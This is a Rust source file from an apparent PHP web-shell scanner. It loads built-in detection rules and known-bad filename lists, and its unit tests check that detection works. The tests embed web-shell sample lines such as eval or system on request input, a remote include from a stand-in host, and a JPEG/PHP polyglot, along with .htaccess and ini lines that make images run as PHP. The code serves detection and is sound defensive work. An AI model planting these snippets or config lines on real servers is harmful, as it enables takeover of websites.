//! Embedded signature data: IOC file names and the built-in rule sets.

use crate::finding::Severity;
use crate::rules::{RuleError, RuleSet};
use regex::{Regex, RegexBuilder};
use serde::{Deserialize, Serialize};

pub const IOC_FILENAMES_TOML: &str = include_str!("../signatures/ioc_filenames.toml");
pub const RULES_CORE_TOML: &str = include_str!("../signatures/rules_core.toml");
pub const RULES_WEBSERVER_TOML: &str = include_str!("../signatures/rules_webserver.toml");

/// Built-in rules (core content rules + web server config rules).
pub fn builtin_rules() -> Result<RuleSet, RuleError> {
    let mut set = RuleSet::from_toml("builtin:rules_core", RULES_CORE_TOML)?;
    set.extend(RuleSet::from_toml(
        "builtin:rules_webserver",
        RULES_WEBSERVER_TOML,
    )?);
    Ok(set)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IocEntrySpec {
    pub name: String,
    pub severity: Severity,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exact: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub prefix: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub regex: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reference: Option<String>,
    /// Match case-sensitively (regex / exact / prefix as written).
    #[serde(default)]
    pub case_sensitive: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct IocFile {
    #[serde(default)]
    entry: Vec<IocEntrySpec>,
}

#[derive(Debug, Clone)]
enum Matcher {
    Exact(String),
    Prefix(String),
    Regex(Regex),
}

#[derive(Debug, Clone)]
pub struct IocEntry {
    pub spec: IocEntrySpec,
    matcher: Matcher,
}

impl IocEntry {
    pub fn matches(&self, file_name: &str) -> bool {
        let name = if self.spec.case_sensitive {
            file_name.to_string()
        } else {
            file_name.to_ascii_lowercase()
        };
        match &self.matcher {
            Matcher::Exact(e) => name == *e,
            Matcher::Prefix(p) => name.starts_with(p.as_str()),
            Matcher::Regex(r) => r.is_match(file_name),
        }
    }
}

/// Known-bad file name list.
#[derive(Debug, Clone, Default)]
pub struct IocList {
    entries: Vec<IocEntry>,
}

impl IocList {
    pub fn builtin() -> Result<Self, RuleError> {
        IocList::from_toml("builtin:ioc_filenames", IOC_FILENAMES_TOML)
    }

    pub fn from_toml(name: &str, text: &str) -> Result<Self, RuleError> {
        let file: IocFile =
            toml::from_str(text).map_err(|e| RuleError::Parse(name.to_string(), e.to_string()))?;
        let mut entries = Vec::with_capacity(file.entry.len());
        for spec in file.entry {
            let cs = spec.case_sensitive;
            let matcher = if let Some(e) = &spec.exact {
                Matcher::Exact(if cs {
                    e.clone()
                } else {
                    e.to_ascii_lowercase()
                })
            } else if let Some(p) = &spec.prefix {
                Matcher::Prefix(if cs {
                    p.clone()
                } else {
                    p.to_ascii_lowercase()
                })
            } else if let Some(r) = &spec.regex {
                let re = RegexBuilder::new(r)
                    .case_insensitive(!cs)
                    .build()
                    .map_err(|source| RuleError::Pattern {
                        rule: spec.name.clone(),
                        pattern: r.clone(),
                        source,
                    })?;
                Matcher::Regex(re)
            } else {
                continue;
            };
            entries.push(IocEntry { spec, matcher });
        }
        Ok(IocList { entries })
    }

    pub fn extend(&mut self, other: IocList) {
        self.entries.extend(other.entries);
    }

    pub fn len(&self) -> usize {
        self.entries.len()
    }

    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    pub fn iter(&self) -> impl Iterator<Item = &IocEntry> {
        self.entries.iter()
    }

    /// First (most severe) matching entry for a file name.
    pub fn lookup(&self, file_name: &str) -> Option<&IocEntry> {
        self.entries
            .iter()
            .filter(|e| e.matches(file_name))
            .max_by_key(|e| e.spec.severity)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builtin_signatures_parse() {
        let rules = builtin_rules().expect("rules compile");
        assert!(rules.len() > 10);
        let iocs = IocList::builtin().expect("iocs compile");
        assert!(iocs.len() > 5);
    }

    #[test]
    fn ioc_lookup() {
        let iocs = IocList::builtin().unwrap();
        assert_eq!(
            iocs.lookup("c99shell.php").unwrap().spec.severity,
            Severity::Critical
        );
        assert_eq!(
            iocs.lookup("WSO2.PHP").unwrap().spec.severity,
            Severity::Critical
        );
        assert_eq!(
            iocs.lookup("photo.jpg.php").unwrap().spec.severity,
            Severity::Critical
        );
        assert_eq!(
            iocs.lookup("phpinfo.php").unwrap().spec.severity,
            Severity::Warning
        );
        assert!(iocs.lookup("index.php").is_none());
        assert!(iocs.lookup("ProductController.php").is_none());
        // PSR-4 class files that merely share a name with shell families.
        assert!(iocs.lookup("Uploader.php").is_none());
        assert!(iocs.lookup("Info.php").is_none());
        assert!(iocs.lookup("Test.php").is_none());
        assert!(iocs.lookup("uploader.php").is_some());
        assert!(iocs.lookup("cmd.php").is_some());
        // Templates and dev artefacts that share a name with shells or droppers.
        assert!(iocs.lookup("info.phtml").is_none());
        assert_eq!(
            iocs.lookup("404.php").unwrap().spec.severity,
            Severity::Info
        );
        assert_eq!(
            iocs.lookup("objectsCode.php.txt").unwrap().spec.severity,
            Severity::Warning
        );
        assert!(iocs.lookup(".php-cs-fixer.dist.php").is_none());
        assert_eq!(
            iocs.lookup(".x.php").unwrap().spec.severity,
            Severity::Critical
        );
        assert_eq!(
            iocs.lookup("1.php").unwrap().spec.severity,
            Severity::Warning
        );
    }

    #[test]
    fn core_rules_hit_known_samples() {
        let rules = builtin_rules().unwrap();
        let samples: &[(&str, &[u8])] = &[
            ("php_eval_base64", b"<?php eval(base64_decode('aGVsbG8='));"),
            ("php_china_chopper", b"<?php @eval($_POST['cmd']);?>"),
            ("php_eval_request_input", b"<?php system($_GET['c']);"),
            (
                "php_remote_include",
                b"<?php include('http://evil.tld/x.txt');",
            ),
            (
                "php_hex_escaped_builtin",
                b"<?php $f=\"\\x65\\x76\\x61\\x6c\"; $f('x');",
            ),
        ];
        for (name, data) in samples {
            let hits = rules.scan("php", data);
            assert!(
                hits.iter().any(|h| h.rule.name() == *name),
                "expected {name} to match {:?}, got {:?}",
                String::from_utf8_lossy(data),
                hits.iter().map(|h| h.rule.name()).collect::<Vec<_>>()
            );
        }
        let clean = b"<?php\nnamespace JTL\\Shop;\nclass Product { public function price(): float { return 1.0; } }";
        assert!(rules.scan("php", clean).is_empty());
        // Substrings of ordinary identifiers must not trigger shell markers.
        let legit = b"<?php $x = 'Magento\\Core\\PublicFilesManagerInterface'; case Table::TYPE_DATETIME: $isUnsigned = null;";
        assert!(rules.scan("php", legit).is_empty());
        assert!(!rules
            .scan("php", b"<?php FilesMan ... Uname: <b>Linux")
            .is_empty());
        // Random `<?=` bytes inside a JPEG are not a polyglot.
        assert!(rules
            .scan("image", b"\xff\xd8\xff\xe0JFIF\x00\x01<?=\xff\x00")
            .is_empty());
        assert!(!rules
            .scan("image", b"\xff\xd8\xff\xe0JFIF<?php system($_GET['c']);")
            .is_empty());
    }

    #[test]
    fn webserver_rules() {
        let rules = builtin_rules().unwrap();
        let bad = b"AddHandler application/x-httpd-php .jpg .png\n";
        assert!(rules
            .scan("htaccess", bad)
            .iter()
            .any(|h| h.rule.name() == "htaccess_php_handler_for_non_php"));
        let ini = b"auto_prepend_file = /tmp/.x.php\n";
        assert!(rules
            .scan("ini", ini)
            .iter()
            .any(|h| h.rule.name() == "htaccess_auto_prepend"));
        let ok = b"RewriteEngine On\nRewriteBase /\nRewriteRule ^(.*)$ index.php [L,QSA]\n";
        assert!(rules.scan("htaccess", ok).is_empty());
    }
}
